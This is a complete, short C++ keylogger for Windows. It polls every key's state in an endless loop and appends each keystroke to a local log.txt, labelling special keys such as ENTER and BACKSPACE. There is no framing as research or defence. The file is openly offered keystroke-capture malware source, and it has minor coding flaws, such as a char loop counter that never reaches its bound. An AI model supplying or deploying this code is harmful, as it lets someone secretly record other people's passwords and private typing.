#include <iostream>
#include <Windows.h>
using namespace std;

int Save(int _key, char *file) {
    cout << _key << endl;

    FILE *output_file;
    output_file = fopen(file, "a+");

    if (_key == VK_SHIFT)
        fprintf(output_file, "%s", "[SHIFT]");
    else if (_key == VK_BACK)
        fprintf(output_file, "%s", "[BACKSPACE]");
    else if (_key == VK_RETURN)
        fprintf(output_file, "%s", "[ENTER]");
    else if (_key == VK_ESCAPE)
        fprintf(output_file, "%s", "[ESCAPE]");
    else
        fprintf(output_file, "%s", &_key);
    

    fclose(output_file);
    return 0;
}

int main(int argc, char *argv[]) {
    //cout << "running in Windows...";
    char i;
    while(true) {
        for (i = 8; i <= 255; i++) {
            if (GetAsyncKeyState(i) == -32767) {
                Save(i, "log.txt");
            }
        }
    }
    return 0;
}